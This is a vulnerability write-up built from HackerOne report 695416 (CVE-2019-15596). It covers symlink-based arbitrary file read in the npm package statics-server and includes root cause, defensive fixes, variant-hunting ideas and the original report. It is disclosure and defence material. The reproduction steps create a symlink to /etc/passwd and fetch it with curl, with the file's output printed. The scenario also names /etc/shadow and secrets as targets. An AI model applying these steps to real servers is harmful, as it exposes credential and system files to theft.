# Path Traversal via Symlink in statics-server

## Metadata
- **Source:** HackerOne
- **Report:** 695416 | https://hackerone.com/reports/695416
- **Submitted:** 2019-09-16
- **Reporter:** zxdrrr
- **Program:** statics-server (npm package)
- **Bounty:** Not specified
- **Severity:** High
- **Vuln:** Path Traversal, Symlink Following, Arbitrary File Read
- **CVEs:** CVE-2019-15596
- **Category:** uncategorised

## Summary
statics-server fails to validate or restrict symlink resolution when serving static files, allowing attackers to read arbitrary files on the system by creating symlinks within the served directory. An attacker can craft a symlink pointing to sensitive files like /etc/passwd and access them through HTTP requests.

## Attack scenario
1. Attacker gains write access to the directory where statics-server is running (or finds a publicly writable directory within it)
2. Attacker creates a symlink using ln -s pointing to a sensitive system file (e.g., /etc/passwd, /etc/shadow, application config files)
3. Attacker sends an HTTP GET request to the symlink path (e.g., curl localhost:8080/passwdsym)
4. statics-server resolves the symlink without validation and follows it to the target file
5. Server returns the contents of the sensitive file to the attacker
6. Attacker now has unauthorized access to system configuration, credentials, or application secrets

## Root cause
The statics-server implementation does not validate or prevent following symbolic links when resolving file paths. The file serving logic treats symlinks the same as regular files, automatically resolving them to their targets without checking if the target lies outside the intended serving directory.

## Attacker mindset
An attacker with local or remote write access to the web root would recognize that symlink-following is not restricted and exploit this to read sensitive files that should be protected. This is a classic privilege escalation and information disclosure technique that requires minimal effort once write access is obtained.

## Defensive takeaways
- Implement symlink resolution validation - use realpath() or similar functions to verify that resolved file paths remain within the intended serving directory
- Add a configuration option to disable symlink following entirely (follow the principle of least privilege)
- Perform path canonicalization and comparison against allowed base directories before serving any file
- Restrict write permissions on the directory being served to prevent unauthorized symlink creation
- Implement access controls and monitoring for file creation in serving directories
- Use security.yml or similar to explicitly define allowed file paths
- Apply principle of least privilege - run the server with minimal necessary permissions

## Variant hunting
Check if other Node.js static file servers (express.static, http-server, etc.) properly validate symlink targets
Test if the vulnerability extends to symlinks pointing to directories, allowing directory traversal
Investigate whether the server follows symlink chains (symlink -> symlink -> file)
Check if race conditions exist where symlinks can be changed between validation and file read
Test if URL encoding or double-encoding bypasses any symlink checks if they exist

## MITRE ATT&CK
- T1190
- T1526
- T1083
- T1087

## Notes
This is a straightforward but dangerous vulnerability affecting a low-profile npm package (80-100 downloads/month). The vulnerability requires either local file write access or a race condition to exploit in practice. The researcher did not contact the maintainer or open an issue, limiting the immediate real-world impact. The suggested patch (adding a flag to disable symlink following) is adequate but not ideal - symlink following should be disabled by default with an explicit opt-in for security.

## Full report
<details><summary>Expand</summary>

I would like to report Path Traversal in statics-server

# Module

**module name:** statics-server
**version:** 0.0.9
**npm page:** `https://www.npmjs.com/package/statics-server`

## Module Description

> npm install statics-server -g
    Go to the folder you want to statics-server
    Run the server statics-server

## Module Stats

> 80-100 downloads/month

# Vulnerability

## Vulnerability Description

> Path traversal using symlink.

## Steps To Reproduce:

* Install statics-server `npm install statics-server -g`
* Run statics-server

```
hawkeye@ubuntu:~/App/$ statics-server
服务器已经启动
访问localhost:8080

```

* Create a symlink inside your project directory.
`$ ln -s /etc/passwd passwdsym`
* Send request to get file.

```
hawkeye@ubuntu:~/$ curl localhost:8080/passwdsym
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
...

```
{F583766}
## Patch

> Providing a flag to disable/enable following symlinks.

## Supporting Material/References:

- Ubuntu 19.04
- Node v10.15.2
- Npm 5.8.0

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

It allows attacker to read content of arbitrary file on remote server.

</details>

---
*Analysed by Claude on 2026-05-24*
